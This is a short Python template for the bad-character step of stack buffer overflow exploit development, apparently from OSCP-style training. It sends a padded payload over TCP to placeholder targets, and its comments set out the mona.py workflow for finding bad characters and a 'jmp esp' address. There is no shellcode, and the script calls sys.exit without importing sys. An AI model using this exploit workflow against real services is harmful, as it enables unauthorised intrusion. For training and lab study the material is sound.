#!/usr/bin/env python3

import socket

ip = "<IP>"
port = <PORT>
prefix = "<COMMAND> "
OFFSET = <OFFSET>
timeout = 5

badchars = ""
#badchars = ""

string = prefix + OFFSET*"A" + 4*"B" + badchars

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(timeout)
    s.connect((ip, port))
    print("Sending pattern...")
    s.send(bytes(string, "latin-1"))
    print("Done")
except:
  print("Could not connect")
  sys.exit(0)

# 1. !mona bytearray -b "\x00"
# 2. run this script with all badchars then compare: !mona compare -f C:\mona\oscp\bytearray.bin -a <esp|address>
# 3. generate badchars with the ones found with generate-badchar.py
# 4. restart this script with new badchars until no corrupted.
# 5. find the jump points: !mona jmp -r esp -cpb "\x00\xa9\xcd\xd4"
